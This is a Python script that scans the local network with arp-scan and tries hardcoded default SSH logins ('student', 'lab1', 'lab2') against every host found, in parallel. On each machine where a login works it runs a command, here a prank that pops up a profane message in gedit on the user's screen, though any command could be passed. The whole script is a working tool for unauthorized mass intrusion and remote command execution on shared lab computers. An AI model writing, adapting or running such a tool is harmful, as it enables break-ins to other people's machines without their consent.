import paramiko
import threading
import os

#$$$$$$$$$$#

THREADS = []

USRS = [["student", "student123"],
        ["lab1", "lab1"],
        ["lab2", "lab2"]]

#$$$$$$$$$$#

def GET_IP() -> None :
    os.system("arp-scan -v > IP.txt")

#$$$$$$$$$$#

def READ_IP() -> None :
    global IP
    global IP_LIST
    IP = open("IP.txt")
    IP_LIST = IP.readlines()

#$$$$$$$$$$#

def HUH_USER(ip: str,
             usr: str,
             passwd: str,
             command: str) -> None :
    try :
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko
                                        .AutoAddPolicy())
        ssh.connect(ip,
                    username=usr,
                    password=passwd,
                    look_for_keys=False)
        ssh.exec_command(command)
        ssh.close()
        print(ip,
              "DONE")
    except :
        print(ip,
              "NOT DONE")

#$$$$$$$$$$#

def HUH(ip: str,
        command: str) -> None :
    global USRS
    threads = []
    for _ in USRS :
        threads.append(threading.Thread(target=HUH_USER,
                                        args=(ip,
                                              _[0],
                                              _[1],
                                              command)))
        threads[-1].start()

#$$$$$$$$$$#

def HUH_ALL(command: str) -> None :
    global THREADS
    global IP_LIST

    for _ in IP_LIST[1:] :
        try :
            THREADS.append(threading.Thread(target=HUH,
                                            args=(_.split()[0],
                                                  command)))
            THREADS[-1].start()
        except Exception as E:
            print(E)
            break

#$$$$$$$$$$#

if __name__ == "__main__" :
    GET_IP()
    READ_IP()
    HUH_ALL("export DISPLAY=:0 && echo 'Surprize Motherfuckers' > qwe && gedit qwe")
